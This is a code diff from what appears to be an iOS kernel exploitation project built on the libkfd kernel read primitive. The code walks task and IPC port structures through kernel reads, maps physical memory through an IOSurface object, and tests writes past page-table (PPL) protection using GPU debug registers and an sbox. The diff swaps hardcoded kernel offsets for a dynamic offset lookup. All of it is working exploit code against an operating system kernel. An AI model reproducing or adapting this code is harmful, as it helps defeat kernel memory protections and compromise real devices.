@@ -13,12 +13,11 @@
 #include <Foundation/Foundation.h>
 #include "GPU_CoreSight.h"
 #include "libkfd.h"
+#include "kfd_meow-Swift.h"
 
 #define DBGWRAP_DBGHALT          (1ULL << 31)
 #define DBGWRAP_DBGACK           (1ULL << 28)
 signed long long base_pac_mask = 0xffffff8000000000;
-
-uint64_t off_ip_kobject = 0x48;
 
 uint32_t sbox[] = {
      0x007, 0x00B, 0x00D, 0x013, 0x00E, 0x015, 0x01F, 0x016,
@@ -197,7 +196,10 @@ mach_port_t IO_GetSurfacePort(uint64_t magic)
 }
 
 uint64_t FindPortAddress(mach_port_t port) {
-    uint64_t itk_space_pac = kread64_kfd(get_current_task() + 0x300);
+    objcbridge *obj = [[objcbridge alloc] init];
+    uint64_t off_task_itk_space = [obj find_ITK_SPACE];
+    
+    uint64_t itk_space_pac = kread64_kfd(get_current_task() + off_task_itk_space);
     uint64_t itk_space = itk_space_pac | 0xffffff8000000000;
     
     uint64_t is_table = kread64_kfd(itk_space + 0x20) | 0xffffff8000000000;
@@ -222,7 +224,7 @@ uint64_t IO_GetMMAP(uint64_t phys, uint64_t size)
 {
     mach_port_t surfaceMachPort = IO_GetSurfacePort(1337);
     uint64_t surface_port_addr = FindPortAddress(surfaceMachPort);
-    uint64_t kobject =kread64_ptr_kfd(surface_port_addr + off_ip_kobject);
+    uint64_t kobject =kread64_ptr_kfd(surface_port_addr + 0x48);
     uint64_t surface = kread64_ptr_kfd(kobject + 0x18);
     uint64_t desc = kread64_ptr_kfd(surface + 0x38);
     uint64_t ranges = kread64_ptr_kfd(desc + 0x60);
@@ -268,10 +270,8 @@ void write_data_with_mmio(uint64_t ttbr0_va_kaddr, uint64_t ttbr1_va_kaddr, uint
 
 void  pplwrite_test(void)
 {
-    uint64_t vm_map = get_current_map();
     uint64_t pmap= get_current_pmap();
     uint64_t ttbr0_va_kaddr =kread64_kfd(pmap + 0);
-    uint64_t vm_map1 = get_kernel_map();
     uint64_t pmap1= get_kernel_pmap();
     uint64_t ttbr1_va_kaddr =kread64_kfd(pmap1 + 0);
     
